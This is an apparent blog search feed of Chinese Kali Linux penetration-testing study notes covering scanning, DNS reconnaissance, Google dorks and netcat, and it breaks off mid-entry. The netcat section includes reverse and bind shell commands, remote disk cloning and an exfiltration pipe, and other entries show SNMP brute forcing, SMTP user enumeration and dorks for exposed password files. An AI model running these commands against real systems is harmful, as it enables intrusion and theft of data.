<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>主动信息收集-防火墙与负载均衡识别</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li><li>设备多种多样，结果存在一定误差</li><li>Send respond type</li><li>scapy脚本</li><li><code>nmap -sA 192.168.0.117 -p 22</code></li><li><img src="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/table.png" alt></li></ul><h2 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h2><ul><li>广域网负载均衡<ul><li>DNS轮询，一个DNS对应多个IP</li><li>基于地理位置的DNS解析</li><li>根据解析速度和链路状态的DNS解析</li></ul></li><li>HTTP-Load balancing<ul><li>Nginx</li><li>Apache</li></ul></li></ul><figure class="hljs highlight plain"><figcaption><span>www.baidu.com```(load balancing detect)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lbd"><br><br><br>## WAF识别<br><br>- Web应用防火墙<br><br>- wafw00f -l<br><br>- &#96;&#96;&#96;wafw00f http:&#x2F;&#x2F;www.microsoft.com<br></code></pre></td></tr></table></figure><ul><li><code>nmap www.microsoft.com --script=http-waf-detect.nse</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-OS识别、SNMP、SMB、SMTP扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-OS%E8%AF%86%E5%88%AB%E3%80%81SNMP%E3%80%81SMB%E3%80%81SMTP%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-OS%E8%AF%86%E5%88%AB%E3%80%81SNMP%E3%80%81SMB%E3%80%81SMTP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><ul><li>操作系统识别技术<ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li></ul><h3 id="主动识别"><a href="#主动识别" class="headerlink" title="主动识别"></a>主动识别</h3><ul><li>TTL起始值<ul><li>Windows:128(65-128)</li><li>Linux/Unix:64(1-64)</li><li>某些Unix:255</li></ul></li></ul><a id="more"></a><ul><li><p>Scapy脚本</p></li><li><p>nmap使用多种技术识别操作系统</p><figure class="hljs highlight plain"><figcaption><span>-O 192.168.0.114```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nmap"><br>- &#96;&#96;&#96;xprobe2 192.168.0.114<br></code></pre></td></tr></table></figure></li></ul><h3 id="被动识别"><a href="#被动识别" class="headerlink" title="被动识别"></a>被动识别</h3><ul><li><p>IDS</p></li><li><p>抓包分析</p></li><li><p>被动扫描</p></li><li><p>p0f</p><ul><li>结合ARP地址欺骗识别全网OS</li></ul></li></ul><h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><ul><li><p>snmp</p><ul><li>简单网络管理协议161 162端口 (DHCP67 68)</li><li>经常被错误配置</li><li>public /private /manager</li></ul></li><li><p>MIB Tree</p><ul><li>SNMP Management Information Base(MIB)</li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li><li><p><code>onesixtyone 1.1.1.1 public</code>(主要用于目标是不是使用public等若community)</p></li><li><p><code>onesixtyone -c dict.txt -i hosts -o my.log -w 100</code>暴破</p><ul><li><code>dpkg -L onesixtyone</code>找到字典位置</li></ul></li><li><p><code>snmpwalk 192.168.0.114 -c public -v 2c</code></p></li></ul><h3 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h3><ul><li><p>Server Message Block 协议</p><ul><li>微软历史上出现安全问题最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问(SMB1)<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户、组SID</li><li>MS08067</li></ul></li></ul></li><li><p><code>nmap 192.168.1.132 -p139,445 --script=smb-os-discovery.nse</code></p></li><li><p>nmap scripts</p></li><li><p>```nbtscan -r 192.168.0.117``</p></li></ul><h3 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h3><ul><li><p>nc -vn 1.1.1.1 25</p><ul><li>VRFY root</li></ul></li><li><p><code>nmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}</code></p></li><li><p><code>nmap smtp.163.com -p25 -script=smtp-open-realy.nse</code></p></li><li><p><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></p></li><li><p>scapy脚本编写</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-服务扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><ul><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul><a id="more"></a></li></ul><h3 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h3><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li><li>连接建立后直接获取banner</li><li>另类服务识别方法<ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li>SNMP<ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li>识别和绕过防火墙筛选</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><ul><li><p><code>nc -nv 1.1.1.1 22</code></p></li><li><pre><code class="python"><span class="meta">&gt;&gt;&gt; </span>banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<span class="meta">&gt;&gt;&gt; </span>banner.connect((<span class="string">"192.168.0.114"</span>,<span class="number">21</span>))<span class="meta">&gt;&gt;&gt; </span>banner.recv(<span class="number">4096</span>)<span class="string">'220 (vsFTPd 2.3.4)\r\n'</span><span class="meta">&gt;&gt;&gt; </span>banner.close()<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>- &#96;&#96;&#96;dmitry -pb 192.168.0.114<br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>nmap -sT 192.168.0.114</code></p></li><li><p><code>amap -B 192.168.0.114 21</code></p></li><li><p><code>nmap 192.168.0.114 -p1-100 -sV</code> (最强大且常用)</p></li><li><p><code>amap 192.168.0.114 1-100</code></p></li><li><p><code>amap 192.168.0.114 1-100 -qb</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集-端口扫描</title>
      <link href="/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/09/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>端口对应网络服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开放的端口</li><li>更具体的攻击面</li></ul><a id="more"></a><h3 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h3><ul><li><p>假设ICMP port-unreachable 响应代表端口关闭</p><ul><li>目标系统不响应ICMP port-unreachable时，可能产生误判</li></ul></li><li><p>Scapy UDP Scan脚本</p><ul><li>端口关闭：unreachable</li><li>端口开放：没有回包</li><li>了解每一种基于UDP的应用层包结构很有帮助</li><li>与三层相同的技术</li><li>误判</li></ul></li><li><p>nmap -sU x.x.x.x  常见1000端口</p></li><li><p>nmap -sU x.x.x.x -p xx 指定端口</p></li></ul><h3 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h3><ul><li>基于连接的协议</li><li>三次握手</li><li>隐蔽扫描（不建立握手）</li><li>僵尸扫描</li><li>全连接扫描</li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li></ul><h4 id="隐蔽扫描——SYN"><a href="#隐蔽扫描——SYN" class="headerlink" title="隐蔽扫描——SYN"></a>隐蔽扫描——SYN</h4><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为——隐蔽</li></ul><h4 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h4><ul><li>极度隐蔽</li><li>实时条件苛刻</li><li>必须可伪造源IP地址</li><li>僵尸机条件：<ul><li>必须是闲置系统</li><li>系统使用递增的IPID（IP包头的id字段）<ul><li>0</li><li>随机</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集--主机发现</title>
      <link href="/2020/09/13/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
      <url>/2020/09/13/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><ul><li><p>直接与目标系统交互通信</p></li><li><p>无法避免留下访问痕迹</p></li><li><p>使用受控的第三方电脑进行探测</p><ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li><p>扫描</p><ul><li>发送不同的探测，根据返回结果判断目标状态</li></ul><a id="more"></a></li></ul><h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><ul><li>识别活着的主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个IP地址列表</li><li>2、3、4层发现</li></ul><h2 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h2><ul><li><p>优点：扫描速度快，可靠。</p></li><li><p>缺点：不可路由</p></li><li><p>Arp协议</p><ul><li>抓包</li></ul></li><li><p>arping</p></li><li><p>arping 1.1.1.1 -c 1</p><ul><li>编写一个扫描本网段的脚本</li><li>编写一个扫描指定ip列表的脚本</li></ul></li><li><p>nmap -sn（nmap还发了一个反向域名解析请求）</p><ul><li>nmap -sn -iL</li></ul></li><li><p>Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换网络</li><li>主动和被动探测<ul><li>主动：<ul><li>netdiscover -i eth0 -r 1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li><li>被动：<ul><li>netdiscover -p</li></ul></li></ul></li></ul></li><li><p>Scapy</p><ul><li>Python库</li><li>也可作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul></li><li><p>apt-get install python3-gnuplot</p></li><li><p>Scapy</p><ul><li>ARP().display()</li><li>sr1()</li><li>Python脚本</li></ul></li><li><p>在不同的环境下可使用的工具不确定。</p></li></ul><h1 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h1><ul><li><p>优点</p><ul><li>可路由</li><li>速度比较快</li></ul></li><li><p>缺点</p><ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li><p>IP、ICMP协议</p></li><li><p>ping</p></li><li><p>traceroute(发的UDP,IP段的TTL=0后会返回ICMP)，每一跳是路由器的内侧网口</p></li><li><p>ping -R返回的是外侧网口 <a href="https://blog.csdn.net/weixin_42714910/article/details/108351817" target="_blank" rel="noopener">点这里了解更多关于ping -R </a></p><ul><li>编写ping扫描网段脚本</li></ul></li><li><p>Scapy</p><ul><li>分别用shell和python编写ping扫描网段脚本<ul><li>读取文件扫描ip列表</li></ul></li></ul></li><li><p>nmap -sn</p><ul><li>如果ip是本网段的就是二层扫描，否则是三层扫描。</li><li>发送了2个ICMP请求，type是8和13.发送了两个TCP消息，一个443 SYN,一个80 ACK。</li><li>对于每个消息如果目标没有响应就会再发一遍。两遍都没有响应就判定host is down.</li></ul></li><li><p>fping</p><ul><li>fping支持地址段扫描</li><li>fping -g 192.168.1.100 192.168.1.200 -c 1</li></ul></li><li><p>Hping</p><ul><li>能够发送激活任意TCP/IP包</li><li>功能强大但每次只能扫描一个目标</li></ul></li></ul><h1 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h1><ul><li><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以返现所有端口都被过滤的主机</li></ul></li><li><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li><p>TCP</p><ul><li>未经请求的ACK——RST</li><li>SYN——SYN/ACK、RST</li></ul></li><li><p>UDP</p><ul><li>ICMP端口不可达、一去不复返</li></ul></li><li><p>ACK——TCP Port——RST</p><ul><li>Scapy</li><li>Python脚本</li></ul></li><li><p>nmap - x.x.x.x -PU53333 -sn  UDP扫描53333端口</p></li><li><p>nmap - x.x.x.x -PA53333 -sn  ACK扫描53333端口 (PS PA PU PY(SCTP))</p></li><li><p>hping3 –udp xxx -c 1</p></li></ul><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><ul><li>|egrep -v “xxx”<ul><li>除符合xxx的字段</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleHacking、Recon-ng</title>
      <link href="/2020/08/31/GoogleHacking%E3%80%81Recon-ng/"/>
      <url>/2020/08/31/GoogleHacking%E3%80%81Recon-ng/</url>
      
        <content type="html"><![CDATA[<h1 id="搜索引擎使用技巧"><a href="#搜索引擎使用技巧" class="headerlink" title="搜索引擎使用技巧"></a>搜索引擎使用技巧</h1><ul><li><p>+-</p></li><li><p>“ “</p></li><li><p>intitle:</p></li><li><p>intext:</p></li><li><p>site:</p></li><li><p>inurl:</p></li><li><p>filetype:</p><a id="more"></a></li></ul><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>inurl:”level/15/exec/show”</p><p>intitle:”netbotz appliance” “ok”</p><p>inurl:/admin/login.php</p><p>inurl:qq.txt</p><p>filetype:xls “username|password”</p><p>inurl:ftp filetype:xls </p><p>inurl:ftp “password” filetype:xls site:baidu.com</p><h1 id="其它搜索引擎"><a href="#其它搜索引擎" class="headerlink" title="其它搜索引擎"></a>其它搜索引擎</h1><p>duckduckgo</p><p>yandex</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>theHarvester（OSINT gathering）</li><li>metagoofil（search and download specific filetypes）</li><li>Tmux 是一个终端复用器（terminal multiplexer）</li><li>meltago（图形界面）</li></ul><h1 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h1><ul><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web/php" target="_blank" rel="noopener">http://www.archive.org/web/web/php</a></li></ul><h1 id="个人专属密码字典"><a href="#个人专属密码字典" class="headerlink" title="个人专属密码字典"></a>个人专属密码字典</h1><ul><li><p>按个人信息生成其专属的密码字典</p></li><li><p>CUPP——Common User Password Profile</p><ul><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i</li></ul></li></ul><h1 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h1><ul><li><p>Exif图片信息:</p><ul><li>exiftool x.jpg</li></ul></li><li><p>Foca(Windows)</p></li></ul><h1 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h1><ul><li>全特性Web侦察框架</li><li>基于Python开发</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动信息收集-DNS与SHODAN</title>
      <link href="/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/"/>
      <url>/2020/08/30/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DNS%E4%B8%8ESHODAN/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h1><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><a id="more"></a><h1 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h1><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h1 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h1><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A、C name、NS、MX、ptr</li></ul></li><li><p>nslookup</p><ul><li>set q=a、ns、mx、any</li><li>server</li><li>nslookup -q=any 163.com </li></ul></li></ul><p>/etc/resolv.conf</p><ul><li>dig<ul><li>dig +noall +answer mail.163.com|awk ‘{print $5}’</li><li>反向查询<code>dig -x xx.x.x.xx</code> </li><li>bind版本信息<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code>直接向根域名服务器发起查询</li></ul></li><li>dig +trace查询过程抓包<ul><li>向本地DNS服务器查询root的NS记录，得到13个DNS根服务器名称 X.root-server.net </li><li>向本地DNS服务器查询 X.root-server.net对应的A记录</li><li>随机选择一个 X.root-server.net 查询sina.com的A记录，得到13个COM顶级域名服务器名称</li><li>向本地DNS服务器查询X.gtld-server.net对应的A记录</li><li>随机选择一个X.gtld-server.net 查询sina.com的A记录，得到7个sina.com的权威域名服务器名称</li><li>向本地DNS服务器查询七个权威域名服务器的A记录</li><li>向权威域名服务器查询sina.com的A记录，得到sina.com对应的IP</li></ul></li></ul><h1 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h1><ul><li>type: AXFR</li><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com</li></ul><h1 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h1><ul><li>fierce -dnsserver 8.8.8.8  -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsmap sina.com -w dns.txt</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnsrecon -t std -d sina.com</li><li>将多个字典集成1个大字典，熟练使用一两个dns爆破命令。</li></ul><h1 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h1><ul><li>Whois</li><li>whois -h whois.apnic.net 192.0.43.10</li></ul><h1 id="信息搜集——搜索引擎"><a href="#信息搜集——搜索引擎" class="headerlink" title="信息搜集——搜索引擎"></a>信息搜集——搜索引擎</h1><ul><li><p>公司新闻动态</p></li><li><p>重要雇员信息</p></li><li><p>机密文档/网络拓扑</p></li><li><p>用户名密码</p></li><li><p>目标系统软硬件技术架构</p></li><li><p>Google Hacking、Baidu Hacking、Bing Hacking</p></li></ul><h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><ul><li><p>搜索互联网的设备</p></li><li><p>Banner:http、ftp、ssh、telnet</p></li><li><p><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></p></li><li><p>常见filter</p></li><li><p>net(192.168.20.1)</p></li><li><p>city</p></li><li><p>country(CN、US)</p></li><li><p>port(80、21、22、23)</p></li><li><p>os</p></li><li><p>Hostname(主机域名)</p></li><li><p>server</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WireShark&amp;TCPdump</title>
      <link href="/2020/08/28/WireShark&amp;TCPdump/"/>
      <url>/2020/08/28/WireShark&amp;TCPdump/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><ul><li><p>抓包嗅探协议分析</p></li><li><p>安全专家必备技能</p></li><li><p>抓包引擎</p><ul><li>Libpcap9——Linux</li><li>Winpcap10——Windows</li></ul></li><li><p>解码能力</p><a id="more"></a></li></ul><h2 id="数据包的分层结构"><a href="#数据包的分层结构" class="headerlink" title="数据包的分层结构"></a>数据包的分层结构</h2><ul><li>常见协议包<ul><li>ARP</li><li>ICMP</li><li>TCP</li><li>UDP</li><li>DNS</li><li>HTTP</li><li>FTP</li></ul></li><li>wireshark官网有各种协议的包供下载</li></ul><h2 id="信息统计功能-statistics"><a href="#信息统计功能-statistics" class="headerlink" title="信息统计功能 statistics"></a>信息统计功能 statistics</h2><ul><li>节点数 EndPoints</li><li>协议分布  Protocol Hierarchy</li><li>包大小 Packet Lengths</li><li>会话    Conversations</li><li>解码方式 Decode As…</li><li>专家系统 Expert information</li></ul><h2 id="企业抓包部署方案"><a href="#企业抓包部署方案" class="headerlink" title="企业抓包部署方案"></a>企业抓包部署方案</h2><ul><li>Sniffer</li><li>全流量分析</li></ul><h1 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h1><h1 id="TCPDMUP——筛选"><a href="#TCPDMUP——筛选" class="headerlink" title="TCPDMUP——筛选"></a>TCPDMUP——筛选</h1><h1 id="过程文档记录工具"><a href="#过程文档记录工具" class="headerlink" title="过程文档记录工具"></a>过程文档记录工具</h1><ul><li>dradis</li><li>keepnote</li><li>truecrypt</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工具中的瑞士军刀-NETCAT</title>
      <link href="/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/"/>
      <url>/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/</url>
      
        <content type="html"><![CDATA[<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><ul><li>nc -nv 1.1.1.1 110</li></ul><a id="more"></a><h1 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h1><ul><li>nc -l -p 4444</li><li>nc -nv 1.1.1.1 4444<br>审计时，输出到其它计算机<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">nc -l -p 333 &gt; ps.txt<br>ps -aux|nc -nv 10.1.1.12 333 -q 1<br></code></pre></td></tr></table></figure></li></ul><h1 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h1><ul><li>传输文件<ul><li>A:<code>nc -lp 333 &gt; 1.mp4</code></li><li>B:<code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</code></li><li>或</li><li>A:<code>nc -lp 333 &lt; 1.mp4 -q 1</code></li><li>B:<code>nc -vn 333 &gt; 1.mp4</code></li></ul></li><li>传输目录<ul><li>A:<code>tar -cvf -music/ | nc -lp 333 -q 1</code></li><li>B:<code>nc -nv 1.1.1.1 333 | tar -xvf -</code></li></ul></li><li>传输加密文件<ul><li>A:<code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</code></li><li>B:<code>mcrypt -flush -Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</code></li></ul></li></ul><h1 id="NC——流媒体服务"><a href="#NC——流媒体服务" class="headerlink" title="NC——流媒体服务"></a>NC——流媒体服务</h1><ul><li>A:<code>cat 1.mp4 | nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000 -</code></li></ul><h1 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h1><ul><li><code>nc -nvz 1.1.1.1 -65535</code> TCP端口</li><li><code>nc -nvzu 1.1.1.1 1-1024</code> UDP端口</li></ul><h1 id="NC——远程硬盘克隆"><a href="#NC——远程硬盘克隆" class="headerlink" title="NC——远程硬盘克隆"></a>NC——远程硬盘克隆</h1><ul><li><code>nc -lp 333|dd of=/dev/sda</code></li><li><code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li></ul><h1 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h1><ul><li>正向：<ul><li>A:<code>nc -lp 333 -c bash</code></li><li>B:<code>nc -nv 1.1.1.1 333</code></li></ul></li><li>反向：<ul><li>A:<code>nc -lp 333</code></li><li>B:<code>nc -nv 1.1.1.1 333 -c bash</code></li></ul></li><li>注：Windows把bash改成cmd</li></ul><h1 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" title="NC——NCAT"></a>NC——NCAT</h1><ul><li>NC缺乏加密和身份验证的能力</li><li>Ncat</li><li>A:<code>ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code></li><li>B:<code>ncat -nv 1.1.1.1 333 --ssl</code></li><li>不同平台/系统 nc参数功能不尽相同</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
